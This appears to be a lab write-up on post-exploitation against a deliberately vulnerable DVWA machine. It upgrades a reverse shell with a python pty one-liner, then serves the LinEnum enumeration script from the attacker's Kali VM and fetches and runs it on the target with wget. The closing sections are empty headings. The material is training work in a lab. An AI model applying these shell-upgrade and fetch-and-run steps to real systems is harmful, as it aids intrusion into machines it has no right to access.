# Post Exploitation and Privilege Escalation:

At this stage trying to execute a command using the sudo keyword gives us the following:

![Screen Shot 2022-04-25 at 13 28 35](https://user-images.githubusercontent.com/18306338/165151242-b36a820b-e655-4dbc-9588-98a840e50e3c.png)

The "no tty present on askpass program specified" message indicates we are not an user with sudo privileges.

In order to do an upgrade of our shell we need to resort to a python library called 'pty', which spawns a tty shell for us.

![Screen Shot 2022-04-25 at 13 35 11](https://user-images.githubusercontent.com/18306338/165151353-1a958504-d817-401b-b5e6-83516e97fa48.png)

https://netsec.ws/?p=337 - the following link gives quite a few options to spawn a tty shell using different scripting languages.

After executing the python -c 'import pty; pty.spawn("/bin/sh")' command we now see a different output when we execute sudo -l in our terminal.

![Screen Shot 2022-04-25 at 13 36 25](https://user-images.githubusercontent.com/18306338/165151424-a53572c9-4704-4850-9c9c-df2c44c1eaaa.png)

The first stage of 'upgrading' our terminal in now complete.

Next step is to enumerate the machine and get information about running processes/cron jobs/sudo users etc.
In order to achieve that we will use a tool called LinEnum.

First thing we need to do is download the git repo to our machine

![Screen Shot 2022-04-25 at 14 17 17](https://user-images.githubusercontent.com/18306338/165151715-c401f17e-d32c-46c4-ae77-be07ad76da45.png)

We can see the .sh file that we need to execute.

In order to execute the bash script file onto the DVWA machine we need to serve this file on a server, which will make the file accessible on the dvwa machine through the wget tool . For that purpose we use python http.server package.

We start the python server

<img width="728" alt="Screen Shot 2022-04-25 at 14 21 26" src="https://user-images.githubusercontent.com/18306338/165152343-e6744472-68a7-4538-9cfd-3fff18cc96e9.png">

Then we obtain the ip address of our Kali VM

![Screen Shot 2022-04-25 at 14 27 52](https://user-images.githubusercontent.com/18306338/165152506-6eaec5ff-e0de-4c96-994c-f6a8de87b404.png)

After we have the python server running and the ip address we navigate to the reversed shell and run ls -la command to see where we have write access.

After entering the tmp folder we use wget to get the http:\\10.0.2.15:8000\LinEnum\LinEmun.sh file

![Screen Shot 2022-04-25 at 14 36 34](https://user-images.githubusercontent.com/18306338/165152577-99ebd22b-f22a-4db7-bd0d-645919e978d5.png)

Initially trying to run the LinEmun.sh script yields a "Permission denied error". This is usually due to the fact that the file in place is missing the executable right and once added the script runs and we gather information for the DVWA machine.

<img width="765" alt="Screen Shot 2022-04-25 at 14 40 53" src="https://user-images.githubusercontent.com/18306338/165153030-c7ffb42f-7174-46a1-a140-4fc7217300f8.png">

## What is DVWA vulnerable to?

In order to evaluate what DVWA is vulnerable to we use the same approach with another tool called LinPeas.


## What are the most probable exploits? (try using Linux exploit suggester)

## Check the most probable vulnerabilities

## Extra Mile: Try to exploit the machine using the most probable vulnerabilities
